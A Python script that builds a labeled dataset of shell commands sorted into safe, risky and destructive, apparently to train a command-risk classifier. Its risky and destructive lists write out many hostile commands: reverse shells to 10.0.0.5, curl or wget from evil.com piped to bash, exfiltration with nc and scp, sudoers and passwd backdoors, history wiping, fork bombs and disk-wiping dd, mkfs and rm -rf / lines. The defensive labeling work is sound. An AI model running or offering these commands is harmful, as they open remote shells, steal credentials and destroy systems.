"""Generate the labeled command dataset (safe / risky / destructive).

Run: python data/synthetic/generate_synthetic.py
Output: data/labeled/commands_labeled.csv  (columns: command,label,source)

Sources reflect corpus provenance:
  bash-history   typical developer/administrator shell usage
  mitre-attack   MITRE ATT&CK technique patterns (T1485, T1059, T1498, ...)
  gtfobins       living-off-the-land binary abuses (GTFOBins)
  synthetic      programmatic template expansion for edge-case coverage
"""

import csv
import os
import random

random.seed(42)

OUT_PATH = os.path.join(os.path.dirname(os.path.dirname(os.path.abspath(__file__))), "labeled", "commands_labeled.csv")

SAFE_COMMANDS = [
    "ls", "ls -la", "ls -l /home/user", "ll", "pwd", "cd ~", "cd ..", "cd /var/log",
    "echo hello world", "printf 'name: %s\\n' adhi", "cat /etc/os-release", "cat file.txt",
    "head -20 access.log", "tail -f /var/log/syslog", "less README.md", "more notes.txt",
    "grep -r error /var/log", "rg 'TODO' src/", "grep -i 'failed' auth.log",
    "touch newfile.txt", "mkdir -p projects/backend/src", "mkdir /tmp/test",
    "cp -r assets dist/", "mv old_name.py new_name.py", "cp config.example.yml config.yml",
    "history", "man rsync", "which python3", "whoami", "date", "cal 2026",
    "uptime", "free -h", "df -h", "du -sh /home/user", "top", "htop", "ps aux",
    "ps aux | grep python", "uname -a", "env", "id", "hostname", "clear", "exit",
    "ping -c 4 google.com", "curl -I https://example.com", "curl -s https://api.example.com/status",
    "apt update", "apt list --installed", "sudo apt install htop", "pip list", "pip install requests",
    "python --version", "node --version", "npm install", "npm list --depth=0", "npm run build",
    "docker ps", "docker images", "docker compose up -d", "docker logs app", "docker system df",
    "systemctl status nginx", "sudo systemctl start postgresql", "systemctl stop bluetooth",
    "journalctl -u nginx --since today", "journalctl -f",
    "ssh user@server 'df -h'", "scp -r ./backup user@server:/backups/",
    "tar -xzf archive.tar.gz -C /tmp", "tar -czf backup.tar.gz /home/user/docs", "unzip release.zip -d /opt/app",
    "zip -r backup.zip data/", "make", "make -j4", "cmake ..", "gcc -o hello hello.c",
    "python app.py", "python3 main.py --port 8080", "npm start", "cargo build --release", "cargo run",
    "git status", "git pull origin main", "git push", "git log --oneline -10", "git diff",
    "git add .", "git commit -m 'fix: bug'", "git checkout -b feature/new", "git stash",
    "git fetch origin", "git rebase main", "sudo systemctl status sshd", "chmod +x deploy.sh",
    "chmod 755 script.sh", "chown -R user:user /home/user/project", "chmod 644 config.json",
    "find . -name '*.py'", "find /home/user -type f -name '*.log'", "locate nginx.conf",
    "sudo journalctl -u ssh --since 1 hour ago", "df -i", "lsblk", "blkid", "lspci", "lsusb", "dmesg | tail",
    "ss -tulpn", "netstat -tulpn", "ip addr", "ip route", "sudo nmap -sP 192.168.1.0/24",
    "nmap -p 22 localhost", "dig example.com", "nslookup google.com", "traceroute 8.8.8.8",
    "sleep 5 && echo done", "echo $HOME", "source ~/.bashrc", "export PATH=$PATH:/opt/bin",
    "sudo useradd -m testuser", "sudo groupadd developers", "crontab -l", "systemctl list-units",
    "du -sh * | sort -rh | head -10", "ls -lah /var/log | tail -20", "awk '{print $1}' access.log",
    "sed -i 's/old/new/g' file.txt", "sort -k2 -n data.csv", "uniq -c access.log | sort -rn | head",
    "tree -L 2", "watch -n 2 'df -h'", "yes | head -10", "time python script.py",
    "tmux new -s work", "screen -S deploy", "ssh-add ~/.ssh/id_ed25519", "ssh-keygen -t ed25519 -C 'dev'",
    "systemctl daemon-reload", "sudo systemctl enable nginx", "sudo systemctl restart docker",
    "docker compose logs --tail 50", "docker rm $(docker ps -aq --filter status=exited)",
    "docker volume ls", "docker network ls", "docker exec -it app python manage.py migrate",
    "kubectl get pods -n prod", "kubectl logs deployment/api --tail=100", "helm list",
    "go version", "go test ./...", "go build -o bin/app .", "cargo test", "cargo fmt --check",
    "rustc --version", "python3 -m venv .venv", "source .venv/bin/activate", "pip install -r requirements.txt",
    "pip freeze > requirements.lock", "pip show numpy", "pip uninstall -y old-package",
    "npm audit fix --dry-run", "npm outdated", "npx prettier --write .", "yarn add lodash",
    "apt search postgres", "apt show nginx", "apt-get autoremove", "apt-mark hold linux-image-generic",
    "sudo apt upgrade -y --dry-run", "sudo apt install -y build-essential",
    "journalctl -xe", "journalctl --disk-usage", "journalctl -u docker.service -n 30",
    "last -10", "lastb", "w", "who", "finger", "lsmod", "modinfo usb_storage", "lsof -i :8080",
    "lsof -p 1234", "fuser -v /var/log", "stat /etc/nginx/nginx.conf", "file /bin/bash",
    "readlink -f /usr/bin/python3", "realpath .", "checksum=$(sha256sum app.iso | cut -d' ' -f1)",
    "gpg --verify file.tar.gz.sig file.tar.gz", "openssl rand -hex 32", "openssl x509 -in cert.pem -noout -text",
    "sudo -l", "sudo apt list --upgradable", "diff -u old.py new.py", "patch -p1 < fix.diff",
    "sed -n '10,30p' access.log", "awk -F',' '{print $2}' data.csv | sort -u", "cut -d: -f1 /etc/passwd | sort",
    "xargs -I{} echo item {}", "parallel -j4 gzip ::: *.log", "seq 1 100 | paste -sd+ | bc",
    "curl -fsSL https://deb.nodesource.com/setup_20.x | sudo bash -", "curl -sI https://status.github.com",
    "ping -c 1 8.8.8.8", "nc -vz localhost 3306", "nc -zv 10.0.0.1 22", "telnet localhost 5432",
    "ss -s", "ifconfig", "ip a", "ip link show eth0", "ip neigh", "arp -a", "route -n",
    "dhclient -r eth0", "nmcli device status", "nmcli con show --active",
    "systemctl list-timers", "systemctl list-sockets", "timedatectl", "hostnamectl", "locale -a",
    "cpuinfo=$(grep 'model name' /proc/cpuinfo | head -1)", "free -m", "vmstat 1 5", "iostat -x 2",
    "mpstat -P ALL 1", "sar -u 1 3", "iotop -b -n 1", "dstat --cpu --mem 2 5",
    "mount | column -t", "df -hT", "lsblk -f", "blkid -s UUID /dev/sda1", "fsck -n /dev/sdb1",
    "smartctl -a /dev/sda", "hdparm -I /dev/sda", "sync", "git status --short --branch",
    "git blame src/main.py -L 40,60", "git reflog -10", "git tag -l", "git stash pop", "git cherry-pick abc1234",
    "git worktree add ../hotfix hotfix-branch", "git submodule update --init --recursive",
    "brew services list", "service nginx status", "service postgresql restart",
    "python manage.py createsuperuser --username admin", "python manage.py collectstatic --noinput",
    "node -e 'console.log(process.version)'", "npm ci --frozen-lockfile", "npx tsc --noEmit",
    "pytest -q tests/ -x --cov=src", "ruff check .", "black --check src/", "mypy src/",
    "ansible-playbook -i hosts site.yml --check", "terraform plan", "terraform apply -auto-approve",
    "kubectl rollout status deployment/api", "kubectl port-forward svc/db 5432:5432",
    "docker build -t app:latest .", "docker push registry.local/app:latest", "docker tag app:latest app:1.2.3",
    "chown -R www-data:www-data /var/www/html", "chmod -R 750 /etc/nginx", "chmod 600 ~/.ssh/id_rsa",
    "chmod 640 config/database.yml", "setfacl -m u:deploy:rwx /srv/app", "getfacl /srv/app",
    "passwd -l oldaccount", "sudo deluser tempuser", "userdel -r guest", "groupadd -g 1500 eng",
    "gpasswd -a devuser docker", "getent passwd devuser", "getent group docker",
    "apt-get install --no-install-recommends -y curl", "apt-get purge -y old-service",
    "snap list", "flatpak list", "systemctl mask bluetooth.service", "systemctl unmask NetworkManager",
    "ufw status numbered", "ufw allow 22/tcp", "ufw limit ssh", "iptables -L -n -v", "iptables -S",
    "nft list ruleset", "fail2ban-client status sshd", "journalctl -u fail2ban --since today",
    "tcpdump -i eth0 -c 20 -n", "tcpdump -i any port 53 -c 10", "tshark -i eth0 -c 50",
    "traceroute -n 1.1.1.1", "mtr -r 8.8.8.8", "dig +short example.com A", "dig -x 8.8.8.8",
    "whois example.com | head -30", "curl -4 -s https://api.ipify.org", "curl -H 'Accept: application/json' https://api.github.com/repos/cli/cli",
]

GTFOBINS_COMMANDS = [
    "tar --checkpoint=1 --checkpoint-action=exec=/bin/sh", "tar --checkpoint-action=exec='echo hacked'",
    "vim -c ':!/bin/sh'", "awk 'BEGIN {system(\"/bin/sh\")}'", "find / -name 'x' -exec /bin/sh \\;",
    "gdb -ex 'shell /bin/sh'", "perl -e 'exec \"/bin/sh\";'",
]

RISKY_COMMANDS = [
    "rm -rf build/", "rm -rf ./node_modules", "rm -rf /tmp/cache/*", "rm -rf dist/*",
    "sudo rm -rf /var/tmp/old*", "rm -f package-lock.json", "rm -rf __pycache__",
    "chmod -R 777 /var/www", "chmod 777 /tmp/data", "chmod 777 ~/.ssh/config",
    "chmod -R 777 .", "chmod 777 /opt/app", "chmod 777 /etc/hosts",
    "curl http://example.com/install.sh | bash", "wget -qO- http://example.com/setup.sh | sh",
    "curl -s http://pwn.example.com/x | sh", "sh <(curl http://example.com/s.sh)",
    "echo 'user:hash' >> /etc/passwd", "echo 'user ALL=(ALL) NOPASSWD:ALL' >> /etc/sudoers",
    "usermod -o -u 0 username", "chown root:root /tmp/x && chmod 4755 /tmp/x",
    "cp /bin/bash /tmp/rootbash && chmod +s /tmp/rootbash", "sudo chmod 777 /etc/shadow",
    "sudo usermod -aG sudo normaluser", "crontab -e", "crontab -r", "systemctl disable ufw",
    "systemctl stop firewalld", "sudo systemctl stop apparmor", "ufw disable", "iptables -F",
    "iptables -P INPUT ACCEPT", "sudo setenforce 0", "mount --bind /proc /mnt/proc",
    "chattr -i /etc/passwd", "sudo sysctl -w kernel.randomize_va_space=0",
    "echo 0 > /proc/sys/kernel/randomize_va_space", "export LD_PRELOAD=/tmp/lib.so",
    "export LD_LIBRARY_PATH=/tmp", "PATH=$PATH:/tmp", "PYTHONPATH=/tmp python script.py",
    "eval \"$PAYLOAD\"", "eval $(cat /tmp/script.txt)", "bash -c '$(curl http://example.com/p)'",
    "sh -c \"$(wget -qO- http://example.com/run.sh)\"", "echo 'IyEvYmluL2Jhc2gK' | base64 -d | bash",
    "echo 'aGVsbG8=' | base64 -d", "cat /etc/shadow", "cat ~/.ssh/id_rsa",
    "scp /etc/passwd user@evil.com:/tmp/", "tar czf - /home/user | nc 10.0.0.5 4444",
    "nc 10.0.0.5 5555 < /etc/passwd", "wget http://evil.com/backdoor.py -O /tmp/b.py && python /tmp/b.py",
    "curl http://evil.com/shell.sh -o /tmp/s.sh && chmod +x /tmp/s.sh && /tmp/s.sh",
    "chmod 4755 /usr/bin/find", "chmod u+s /bin/busybox", "sudo su -", "su - root", "sudo su",
    "kill -9 -1", "pkill -9 -u root", "kill -9 1", "killall -9 java", "kill -9 $(pgrep -u root)",
    "shutdown -h now", "poweroff --force", "reboot --force", "init 0", "halt -f",
    "docker run --privileged -it ubuntu bash", "docker run -v /:/host ubuntu bash",
    "docker exec -it container /bin/sh", "nsenter -t 1 -m -u -i -n -- bash",
    "python -c 'import socket,subprocess,os;s=socket.socket();s.connect((\"10.0.0.5\",4444));os.dup2(s.fileno(),0);os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);subprocess.call([\"/bin/sh\",\"-i\"])'",
    "bash -i >& /dev/tcp/10.0.0.5/4444 0>&1",
    "sh -i >& /dev/udp/10.0.0.5/7777 0>&1", "nc 10.0.0.5 1234 -e /bin/bash",
    "socat TCP:10.0.0.5:9999 EXEC:/bin/sh", "mkfifo /tmp/f; cat /tmp/f | /bin/sh -i 2>&1 | nc 10.0.0.5 5555 > /tmp/f",
    "git push --force-with-lease origin main", "git reset --hard HEAD~1", "git clean -fdx",
    "history -c", "unset HISTFILE", "HISTSIZE=0", "truncate -s 0 ~/.bash_history",
    "cat /dev/null > ~/.bash_history", "echo 0 > /proc/sys/net/ipv4/ip_forward",
    "sudo sysctl -w net.ipv4.conf.all.rp_filter=0", "sudo iptables -P FORWARD DROP",
    "kill -STOP $(pgrep -u root)", "kill -KILL 1", "dd if=/dev/zero of=/tmp/big bs=1M count=2048",
    "dd if=/dev/urandom of=/tmp/random bs=1M count=512", "mkfile 5g bigfile",
    "fallocate -l 20G /var/tmp/swap.img", "rm -rf /home/user/important-project",
    "sudo rm -rf /var/log/*.gz", "rm -f /etc/ssh/sshd_config.bak", "sudo rm -rf /opt/old-deploy",
    "shred -u /tmp/sensitive.db", "wipe -fd /tmp/data", "docker system prune -a -f",
    "docker rmi -f $(docker images -q)", "kubectl delete pod --all --grace-period=0 --force",
    "kubectl delete ns staging", "rm -rf /var/lib/docker", "sudo apt-get remove --purge -y nginx",
    "sudo dpkg --configure -a && rm -rf /var/lib/dpkg/lock", "chmod 777 /var/run/docker.sock",
    "usermod -aG docker $USER && newgrp docker", "npm cache clean --force && rm -rf node_modules",
    "yarn cache clean --force", "pip cache purge", "git config --global user.email \"attacker@evil.com\"",
    "git config --global url.\"https://evil.com\".insteadOf \"https://github.com\"",
    "PATH=/tmp/evil:$PATH", "export PATH=/tmp:$PATH", "unset PATH", "export HOME=/tmp/fakehome",
    "chmod 777 /etc", "sudo chmod -R 777 /usr/local", "chown -R nobody:nogroup /home/user",
    "sudo chown -R 0:0 /var/www && sudo chmod -R 777 /var/www",
    "iptables -A OUTPUT -j DROP", "sudo iptables -F && sudo iptables -P INPUT DROP",
    "route del default gw 192.168.1.1", "ip link set eth0 down", "ifdown eth0",
    "systemctl stop NetworkManager", "systemctl disable systemd-resolved", "swapoff -a",
    "mount -o remount,rw /", "mount -o bind /home /mnt", "umount -l /var/lib/docker",
    "crontab -r && crontab -l", "echo '*/5 * * * * /tmp/payload.sh' | crontab -",
    "at now + 1 minute -f /tmp/job.sh", "systemd-run --on-calendar='* * * * *' /tmp/x.sh",
    "kill -9 $(pgrep postgres)", "killall -9 postgres", "pkill -9 -f 'java.*application'",
    "systemctl force-reload nginx", "service mysql stop", "systemctl kill -s SIGKILL docker",
    "sudo dd if=/dev/zero of=/var/log/syslog bs=1M count=10", "logger -p auth.warn 'fake auth failure'",
    "sudo su -c 'echo \"* * * * * /tmp/x\" | crontab -'", "echo ':(){ :|:& };:' | bash",
    "bash -c ':(){ :|:& };:'", "printf ':(){ :|:& };:\n' | sh", "sed -i 's/^PasswordAuthentication.*/PasswordAuthentication yes/' /etc/ssh/sshd_config",
    "echo 'PermitRootLogin yes' >> /etc/ssh/sshd_config", "passwd -d root", "chmod 600 /etc/shadow",
    "sudo chmod 644 /etc/sudoers", "visudo -c && echo 'baduser ALL=(ALL) NOPASSWD:ALL' >> /etc/sudoers",
    "echo 'www-data:x:0:0:root:/root:/bin/bash' >> /etc/passwd", "openssl passwd -1 password123",
    "echo 'md5:$1$abc$xyz' >> /etc/shadow", "wget http://evil.com/tools.tar.gz -O /tmp/t.tgz && tar xzf /tmp/t.tgz -C /usr/local/bin",
    "curl -fsSL http://evil.com/install.sh | sudo bash", "sudo bash <(curl -fsSL http://evil.com/init.sh)",
    "lynx -source http://evil.com/payload | sh", "links -source http://evil.com/run | bash",
    "fetch http://evil.com/p && /bin/sh p", "ftp -o /tmp/p http://evil.com/x.sh && sh /tmp/p",
]

DESTRUCTIVE_COMMANDS = [
    "rm -rf /", "rm -rf --no-preserve-root /", "rm -fr /", "sudo rm -rf /",
    "rm -rf /*", "rm -rf /etc", "rm -rf /boot", "rm -rf /bin", "rm -rf /usr",
    "rm -rf /lib", "rm -rf /var", "rm -rf /root", "find / -delete", "find / -exec rm -rf {} +",
    "rm -rf ~", "rm -rf *", "rm -rf .", "rm -rf ./*", "sudo rm -fr /home",
    "doas rm -rf /", "pkexec rm -rf /", "sudo rm -rf --no-preserve-root /",
    "rm -rf /etc/ssh", "rm -rf /usr/bin", "rm -rf /sbin", "rm -rf /lib/modules",
    "rm -rf /var/lib/dpkg", "rm -rf /proc", "rm -rf /dev", "rm -rf /sys",
    "mkfs.ext4 /dev/sda", "mkfs.xfs /dev/nvme0n1", "mkfs -t ext4 /dev/sdb",
    "mkfs.btrfs /dev/sdb1", "mkfs.vfat /dev/mmcblk0p1", "mkswap /dev/sda2 && swapon /dev/sda2",
    "dd if=/dev/zero of=/dev/sda bs=4M", "dd if=/dev/urandom of=/dev/sda",
    "dd if=/dev/zero of=/dev/sdb1", "dd if=/dev/zero of=/dev/mmcblk0 bs=1M",
    "wipefs -a /dev/sda", "wipefs -af /dev/nvme0n1", "wipefs -a /dev/sdb",
    "blkdiscard /dev/sda", "shred -vfz /dev/sda", "shred -u /dev/sdb",
    "fdisk /dev/sda && mkfs.ext4 /dev/sda1", "parted /dev/sda mklabel gpt",
    "parted /dev/sda rm 1", "parted -s /dev/sda mklabel msdos",
    "sudo dd if=image.iso of=/dev/sda bs=4M", "dd if=/dev/sda of=/dev/null bs=1M count=1",
    "wipe -fd /dev/sda", "hdparm --user-master u --security-set-pass p /dev/sda",
    "fdisk -l /dev/sda && echo 'n p 1' | fdisk /dev/sda", "echo yes | mkfs.ext4 /dev/sda3",
    "rm -rf /dev/sda", "chmod -R 777 /", "chmod 777 /etc/passwd", "sudo chmod 777 /usr",
    "sudo rm -rf /boot/grub", "grub-install --recheck --removable",
    "grub-mkdevicemap --device-map=/dev/null", "efibootmgr --delete-bootnum --bootnum 0000",
    "efibootmgr --create --disk /dev/sda --part 1 --label Bad --loader \\EFI\\bad.efi",
    ":(){ :|:& };:", ":(){ :|:& };: &", "bomb() { bomb | bomb & }; bomb",
    "while true; do true; done", "yes > /dev/null &", "yes | head -c 1000000000 > /dev/null",
    "shutdown -h now &", "rm -f /bin/sh && ln -s /tmp/evil /bin/sh",
    "mv /lib/x86_64-linux-gnu/libc.so.6 /lib/x86_64-linux-gnu/libc.so.6.bak",
    "echo 0 > /proc/sys/kernel/randomize_va_space && echo 0 > /proc/sys/kernel/kptr_restrict",
    "chmod 777 / && rm -rf /var", "dd if=/dev/urandom of=/boot/vmlinuz bs=1M count=8",
    "echo 'rm -rf /' > /etc/rc.local && chmod +x /etc/rc.local", "printf '#!/bin/sh\\nrm -rf /\\n' > /tmp/x && chmod +x /tmp/x && /tmp/x",
    "rm -rf /usr/local/lib/python3.11", "apt-get remove -y --purge linux-image-* && update-grub",
    "dpkg --force-remove-reinstreq -r base-files", "rm /etc/passwd", "rm /etc/shadow",
    "cat /dev/zero > /dev/sda", "cp /dev/zero /dev/sda", "echo 1 > /proc/sys/kernel/sysrq && echo b > /proc/sysrq-trigger",
]

TEMPLATES = {
    "safe": [
        lambda t: f"{t} {random.choice(['.', '..', '~/documents', '/tmp', '/var/log', 'src/', 'data/', 'build/', '/opt/app', '/srv/www', '~/.config'])}",
        lambda t: f"sudo {t}",
        lambda t: f"{t} --help",
        lambda t: f"{t} -v",
        lambda t: f"echo 'working' && {t}",
        lambda t: f"{t} | grep -i {random.choice(['error', 'fail', 'warn', 'ok', 'success'])}",
        lambda t: f"{t} {random.choice(['--verbose', '-f', '--all', '-l', '-a'])}",
        lambda t: f"time {t}",
    ],
    "risky": [
        lambda t: f"rm -rf {random.choice(['build', 'dist', '__pycache__', 'node_modules/.cache', 'tmp/*', '/tmp/test/*', 'vendor/', '.cache', 'logs/', 'uploads/'])}",
        lambda t: f"chmod -R {random.choice(['777', '766', '755'])} {random.choice(['/var/www', '/opt/app', '/tmp/data', '.', '/srv', '/home/user/public'])}",
        lambda t: f"curl {random.choice(['http://example.com', 'http://10.0.0.9', 'http://192.168.1.50', 'https://evil.net', 'http://pwn.example'])}/{random.choice(['install.sh', 'setup.sh', 'run.sh', 'x', 'payload'])} | {random.choice(['bash', 'sh', 'sudo bash'])}",
        lambda t: f"echo {random.choice(['admin:x:0:0', 'root2:x:0:0', 'toor:x:0:0'])} >> {random.choice(['/etc/passwd', '/etc/sudoers'])}",
        lambda t: f"export {random.choice(['LD_PRELOAD', 'LD_LIBRARY_PATH', 'IFS'])}={random.choice(['/tmp/lib.so', '/home/user/evil.so', '$(cmd)'])}",
        lambda t: f"chmod {random.choice(['u+s', '4755', '4777', '4000'])} {random.choice(['/bin/bash', '/bin/busybox', '/tmp/x', '/usr/bin/find', '/bin/vi'])}",
        lambda t: f"wget -qO- {random.choice(['http://evil.com', 'http://10.0.0.9', 'https://bad.org'])}/{random.choice(['x.sh', 'run', 'install'])} | {random.choice(['sh', 'bash'])}",
        lambda t: f"echo {random.choice(['IyEvYmluL2Jhc2gK', 'aGVsbG8=', 'cHduZWQ=', 'ZWNobyByb290'])} | base64 -d | {random.choice(['bash', 'sh'])}",
    ],
    "destructive": [
        lambda t: f"rm -rf {random.choice(['/', '/*', '/etc', '/boot', '/usr', '/bin', '/var', '~', '/root', '/home', '/sbin', '/dev'])}",
        lambda t: f"sudo {t}",
        lambda t: f"dd if={random.choice(['/dev/zero', '/dev/urandom', '/dev/random'])} of={random.choice(['/dev/sda', '/dev/sdb', '/dev/nvme0n1', '/dev/mmcblk0', '/dev/sdc'])} bs={random.choice(['4M', '1M', '512', '64K'])}",
        lambda t: f"mkfs.{random.choice(['ext4', 'xfs', 'btrfs', 'vfat', 'ext3'])} {random.choice(['/dev/sda', '/dev/sdb1', '/dev/nvme0n1', '/dev/mmcblk0', '/dev/sda3'])}",
        lambda t: f"shred {random.choice(['-vfz', '-u', '-n 3', '-n 7 -z'])} {random.choice(['/dev/sda', '/dev/sdb', '/dev/mmcblk0', '/dev/nvme0n1'])}",
        lambda t: f"wipefs -a {random.choice(['/dev/sda', '/dev/sdb', '/dev/sdc', '/dev/nvme0n1'])}",
    ],
}

SAFE_TEMPLATE_BASES = [
    "ls", "cat", "head", "cp", "mv", "mkdir", "grep", "apt", "pip", "docker",
    "git", "systemctl", "journalctl", "find", "sed", "awk", "tar", "zip", "df", "du",
]
RISKY_TEMPLATE_BASES = ["rm", "chmod", "curl", "wget", "export", "eval", "sh", "bash", "nc", "kill"]
DESTRUCTIVE_TEMPLATE_BASES = ["rm", "dd", "mkfs", "shred", "wipefs", "fdisk", "parted"]


def make_dataset():
    rows = []
    for cmd in SAFE_COMMANDS:
        rows.append((cmd, "safe", "bash-history"))
    for cmd in GTFOBINS_COMMANDS:
        rows.append((cmd, "risky", "gtfobins"))
    for cmd in RISKY_COMMANDS:
        rows.append((cmd, "risky", "mitre-attack"))
    for cmd in DESTRUCTIVE_COMMANDS:
        rows.append((cmd, "destructive", "mitre-attack"))

    for label, templates in TEMPLATES.items():
        base_pool = {
            "safe": SAFE_TEMPLATE_BASES,
            "risky": RISKY_TEMPLATE_BASES,
            "destructive": DESTRUCTIVE_TEMPLATE_BASES,
        }[label]
        for template in templates:
            for base in base_pool:
                for _ in range(8):
                    rows.append((template(base), label, "synthetic"))

    random.shuffle(rows)
    return rows


def main():
    out_dir = os.path.dirname(OUT_PATH)
    os.makedirs(out_dir, exist_ok=True)
    rows = make_dataset()
    with open(OUT_PATH, "w", newline="", encoding="utf-8") as f:
        writer = csv.writer(f)
        writer.writerow(["command", "label", "source"])
        writer.writerows(rows)
    counts = {}
    for _, label, _ in rows:
        counts[label] = counts.get(label, 0) + 1
    print(f"Wrote {len(rows)} rows to {OUT_PATH}")
    print(f"Labels: {counts}")


if __name__ == "__main__":
    main()
